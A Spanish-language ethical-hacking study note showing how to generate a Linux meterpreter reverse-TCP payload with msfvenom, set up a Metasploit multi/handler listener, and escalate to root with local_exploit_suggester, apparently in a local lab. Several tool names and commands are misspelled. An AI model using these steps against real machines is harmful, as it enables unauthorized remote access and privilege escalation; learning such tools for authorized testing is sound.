#Mestasploit #HackingEtico 

Para poder ultilizar algún *Payload* de msfvenon, requerimos saber los siguientes parámetros nuestra IP, el puerto que deseamos desear, y el payload que vamos a ultilizar. El comando para saber que payloads existen es:

```bash
msfvenon -l payload
```

Ahora para poder crear un virus con msfvenon requerimos saber a que tipo de maquina le vamos a ser el ataque en mi caso va hacer una maquina linux, por lo que el comando vendría siendo el siguiente

```bash
msfvenon -p linux/x64/meterpreter/reverse_tcp LHOST "IP" LPORT "PUERTO" -f "Extención" -o "Nombre y extencion a guardar"
```

Después de eso se nos va a almacenar en la carpeta actual el archivo con el nombre que lo guardamos anterior mente. Ahora nos vamos a poner por escucha con *msfconsole*, con los siguientes comando.

```bash
msfconsole
use /multi/handler
show options
set LHOST "IP"
set LPORT "PORT"
run
```

*/multi/handler* es el script que nos va a permitir realizar una conexión con la maquina victima, *show options*, es para poder ver las opciones para ver si están configurados la IP, y el Puerto, por lo que entonces en los siguientes comando lo que hacemos es configurar lo para que nos llegue la conexión, y *Run* es para iniciar el programa.

Ahora este se le envía el virus a la victima, en mi caso lo voy a ser todo Local, y después le daré permisos de ejecución. Después lo ejecutamos e inmediatamente podremos ver nuestra conexión en msfconsole. Estos son los comandos que podremos ejecutar.


---
## BUSCAMOS EXPLOITS PARA ESCALAR PRIVILEGIOS

- Mandamos las session a 2 plano con el comando de:
```BASH
background
```

- Vamos a usar la herramienta suggester con el siguiente comando: 
```Bash
use local_exploit_suggester
```

- Procedemos a utilizarlo
- Cargamos las session con 
```Bash
set SESSION "# QUE TOCO"
```
- Y procedemos a utilizarlo
- Seleccionamos uno de los exploit que no han dado y los iniciamos y configuramos.
- Escribimos *Run* y ya seremos usuarios root 
- Para confirmarlo solo tienes que escribir *Shell* y *Whoami*

![[Pasted image 20240112150506.png]]
